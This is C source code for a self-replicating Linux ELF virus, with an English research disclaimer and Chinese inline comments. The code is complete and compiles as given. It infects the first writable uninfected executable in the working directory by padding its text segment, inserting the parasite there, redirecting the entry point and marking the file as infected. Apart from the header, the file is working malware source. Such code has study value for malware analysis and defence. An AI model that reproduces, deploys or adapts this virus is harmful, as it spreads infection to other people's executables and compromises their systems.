/*
 * Linux VIRUS - 12/19/08 Ryan O'Neill
 *
 * -= DISCLAIMER =-
 * This code is purely for research purposes and so that the reader may have a deeper understanding
 * of UNIX Virus infection within ELF executables. 
 *
 * Behavior:
 * The virus copies itself to the first uninfected executable(可执行文件) that it has write 
 * permissions to, therefore the virus copies itself one executable at a time. The virus writes 
 * a bit of magic into each binary that it infects so that it knows not to re-infect it. The virus 
 * at present only infects files within the current working directory, but can easily be modified.
 * 
 * This virus extends/creates a PAGE size padding at the end of the text segment within the host
 * executable, and copies itself into that location. The original entry point is patched to the
 * start of the parasite which returns control back to the host after its execution(可执行文件的
 * 入口被更改). The code is position independent and eludes libc through syscall macros. 
 * 
 * Compile:
 * gcc lpv.c -o lpv -nostdlib
 *
 * elfmaster[at]zoho.com
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/fcntl.h>
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>
#include <asm/stat.h>

#define PAGE_SIZE 4096
#define BUF_SIZE 1024
#define TMP "vx.tmp"

void end_code(void);

unsigned long get_eip();
unsigned long old_e_entry;
void end_code(void);
void mirror_binary_with_parasite (unsigned int, unsigned char *, unsigned int,
				   struct stat, char *, unsigned long);

extern int myend;
extern int foobar; //病毒代码
extern int real_start;

void _start() 
{
    __asm__ __volatile__(
        ".globl real_start\n"
	    "real_start:\n"
	    "pusha\n"
	    "call do_main\n"
	    "popa\n"
	    "jmp myend\n"); //如果在本程序中退出程序;如果在目标代码中则是跳转代码

}

void do_main()
{
    //
    struct linux_dirent
    {
        long d_ino;               //Inode number.
        off_t d_off;              //Offset to next linux_dirent. 
        unsigned short d_reclen;  //Length of this linux_dirent. 
        char d_name[];            //Filename.
    };

    char *host;
    char buf[BUF_SIZE];
    char cwd[2];
    struct linux_dirent *d;
    int bpos;
    int dd, nread;
  
    unsigned char *tp;
    int fd, i, c;
    char text_found;
    mode_t mode;

    struct stat st; 
    //
    unsigned long address_of_main = get_eip() - ((char *)&foobar - (char *)&real_start);
    //病毒代码的大小
    unsigned int parasite_size = (char *)&myend - (char *)&real_start;
    parasite_size += 7;
  
    unsigned long int leap_offset;
    unsigned long parasite_vaddr;
    unsigned int numbytes;
  
    Elf32_Shdr *s_hdr;  //ELF节头
    Elf32_Ehdr *e_hdr;  //ELF头
    Elf32_Phdr *p_hdr;  //ELF程序头

    unsigned long text;
    int nc; 
    int magic = 32769;
    int m, md;
    text_found = 0;
    unsigned int after_insertion_offset;
    unsigned int end_of_text;
  
    int infected;

    cwd[0] = '.';
    cwd[1] = 0;
  
    //Used for debug
    char str[10] = { 'i', 'n', 'f', 'e', 'c', 't', 'e', 'd', '\n', '\0' };
    write(1, str, 10);

    dd = open(cwd, O_RDONLY | O_DIRECTORY);
    //get directory entries.
    nread = getdents(dd, buf, BUF_SIZE);
    for (bpos = 0; bpos < nread; ) {
        d = (struct linux_dirent *) (buf + bpos);
        bpos += d->d_reclen;
        host = d->d_name;
        if (host[0] == '.') //当前目录或者是父目录  
	        continue;
        if (host[0] == 'l' && host[1] == 'p' && host[2] == 'v') //lpv病毒代码本身
	        continue;

        fd = open(d->d_name, O_RDONLY); 
        stat(host, &st);
        char mem[st.st_size];
    
        infected = 0; //是否感染
        c = read(fd, mem, st.st_size);
 
        e_hdr = (Elf32_Ehdr *) mem;
        //不是可执行文件
        if ((e_hdr->e_ident[0] != 0x7f) || (e_hdr->e_ident[1] != 'E')
                || (e_hdr->e_ident[2] != 'L') || (e_hdr->e_ident[3] != 'F')) {
            close(fd);
   	        continue;
        } else {
    	    p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
	        for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) {
		        if (p_hdr->p_type == PT_LOAD) {
			        if (p_hdr->p_flags == (PF_R | PF_X)) {//.text段 	
				        md = open(d->d_name, O_RDONLY);
				        unsigned int pt = (PAGE_SIZE - 4) - parasite_size; //parasite_size必须小于(4096-4)
				        lseek(md, p_hdr->p_offset + p_hdr->p_filesz + pt, SEEK_SET);
				        read(md, &m, sizeof(magic)); //sizeof(magic)=4
				        if (m == magic)
					        infected++; 
				        close(md);
				        break;
			        }
		        }
	        }
        }

        //已经感染
        if (infected) {
	        close(fd);
     	    continue; 
        } else {
     	    p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
            for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) {//程序头
		        if (text_found) {
	  		        p_hdr->p_offset += PAGE_SIZE; //PAGE_SIZE???
			        continue;
		        } else if (p_hdr->p_type == PT_LOAD) {
	  		        if (p_hdr->p_flags == (PF_R | PF_X)) {
	    			    text = p_hdr->p_vaddr;
                        //parasite在内存中的首地址
			            parasite_vaddr = p_hdr->p_vaddr + p_hdr->p_filesz;
	    			    old_e_entry = e_hdr->e_entry; //目标程序的EP
	    			    e_hdr->e_entry = parasite_vaddr;
                        //在文件中的位置
	    			    end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
			            p_hdr->p_filesz += parasite_size; 
			            p_hdr->p_memsz += parasite_size;
	    			    text_found++;
	  		        }
		        }
	        }
        }

        //调整节(section)位置
        s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
        for (i = e_hdr->e_shnum; i-- > 0; s_hdr++) {//节头
            if (s_hdr->sh_offset >= end_of_text)
                s_hdr->sh_offset += PAGE_SIZE;
	        else if (s_hdr->sh_size + s_hdr->sh_addr == parasite_vaddr)
                s_hdr->sh_size += parasite_size;
        } 

        e_hdr->e_shoff += PAGE_SIZE;
        //将病毒代码复制到寄生目标中
        mirror_binary_with_parasite(parasite_size, mem, end_of_text, st, host, address_of_main);
        close (fd);
        goto done;
    }
        done:
        close (dd);
}
 
void mirror_binary_with_parasite (unsigned int psize, 
                                  unsigned char *mem,
                                  unsigned int end_of_text, 
                                  struct stat st, 
                                  char *host, 
                                  unsigned long address_of_main)
{
    int ofd;
    unsigned int c;
    int i, t = 0;
    int magic = 32769;
  
    //
    char tmp[3];
    tmp[0] = '.'; 
    tmp[1] = 'v';
    tmp[2] = 0;
  
    char jmp_code[7];
 
    jmp_code[0] = '\x68'; /* push */
    jmp_code[1] = '\x00'; /* 00 	*/
    jmp_code[2] = '\x00'; /* 00	*/
    jmp_code[3] = '\x00'; /* 00	*/
    jmp_code[4] = '\x00'; /* 00	*/
    jmp_code[5] = '\xc3'; /* ret */
    jmp_code[6] = 0;
 
    int return_entry_start = 1;
    //创建临时文件
    ofd = open(tmp, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
    //将目标代码写入临时文件
    write(ofd, mem, end_of_text);
    *(unsigned long *) &jmp_code[1] = old_e_entry;
    write(ofd, (char *)address_of_main, psize - 7); //病毒代码写入
    write(ofd, jmp_code, 7); //病毒代码执行完后要跳转到目标代码的EP处继续执行
  
    lseek(ofd, (PAGE_SIZE - 4) - psize, SEEK_CUR); 
    write(ofd, &magic, sizeof(magic)); //写入感染标志

    mem += end_of_text;
    //写入剩下的数据
    unsigned int last_chunk = st.st_size - end_of_text;
    write(ofd, mem, last_chunk);
    rename(tmp, host);
    close(ofd);
}

//实际上得到是foobar的地址
unsigned long get_eip(void)
{
    __asm__("call foobar\n"
          ".globl foobar\n"
          "foobar:\n"
          "pop %eax");
}

#define __syscall0(type,name) \
type name(void) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name)); \
return (type)__res; \
}

#define __syscall1(type,name,type1,arg1) \
type name(type1 arg1) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1))); \
return (type)__res; \
}


#define __syscall2(type,name,type1,arg1,type2,arg2) \
type name(type1 arg1,type2 arg2) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
return (type)__res; \
}

#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
type name(type1 arg1,type2 arg2,type3 arg3) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                  "d" ((long)(arg3))); \
return (type)__res; \
}

#define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4) \
type name (type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4))); \
return (type)__res; \
}

#define __syscall5(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
          type5,arg5) \
type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5) \
{ \
long __res; \
__asm__ volatile ("int $0x80" \
        : "=a" (__res) \
        : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
return(type)__res; \
}

//???
#define __syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
          type5,arg5,type6,arg6) \
type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5,type6 arg6) \
{ \
long __res; \
__asm__ volatile ("push %%ebp ; movl %%eax,%%ebp ; movl %1,%%eax ; int $0x80 ; pop %%ebp" \
        : "=a" (__res) \
        : "i" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
          "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5)), \
          "0" ((long)(arg6))); \
return(type),__res; \
}

__syscall1(void, exit, int, status);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall1(int, close, int, fd);
__syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
__syscall3(int, read, int, fd, void *, buf, size_t, count);
__syscall2(int, stat, const char *, path, struct stat *, buf);

//代码段的结束位置
void end_code() 
{
    //exit(0)
    __asm__ __volatile__ (".globl myend\n"
	        "myend:\n"
            "movl $1,%eax\n"
            "movl $0,%ebx\n"
	        "int $0x80\n"); 
}


